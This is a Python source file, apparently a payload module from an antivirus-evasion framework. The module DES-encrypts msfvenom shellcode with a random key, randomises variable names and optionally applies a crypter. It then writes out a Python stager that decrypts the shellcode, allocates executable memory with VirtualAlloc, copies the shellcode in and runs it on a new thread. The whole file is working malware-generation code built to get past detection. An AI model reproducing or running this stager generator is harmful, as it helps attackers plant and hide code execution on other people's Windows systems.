"""

This payload has DES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.

Great examples and code adapted from 
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/
module by @christruncer

"""

from Crypto.Cipher import DES

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "DESVirtualAlloc"
		self.description = "DES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"
		
		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
	
	def generate(self):
		
		# Generate Shellcode Using msfvenom
		Shellcode = self.shellcode.generate()
		
		# Generate Random Variable Names
		RandPtr = randomizer.randomString()
		RandBuf = randomizer.randomString()
		RandHt = randomizer.randomString()
		ShellcodeVariableName = randomizer.randomString()
		RandIV = randomizer.randomString()
		RandDESKey = randomizer.randomString()
		RandDESPayload = randomizer.randomString()
		RandEncShellCodePayload = randomizer.randomString()
		
		# Set IV Value and DES Key
		iv = randomizer.randomKey(8)
		DESKey = randomizer.randomKey(8)
		
		# Create DES Object and encrypt our payload
		desmain = DES.new(DESKey, DES.MODE_CFB, iv)
		EncShellCode = desmain.encrypt(Shellcode)

		# Create Payload File
		PayloadCode = 'from Crypto.Cipher import DES\n'
		PayloadCode += 'import ctypes\n'
		PayloadCode += RandIV + ' = \'' + iv + '\'\n'
		PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
		PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
		PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
		PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
		PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
		PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
		PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
		
		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = crypters.pyherion(PayloadCode)
		
		return PayloadCode

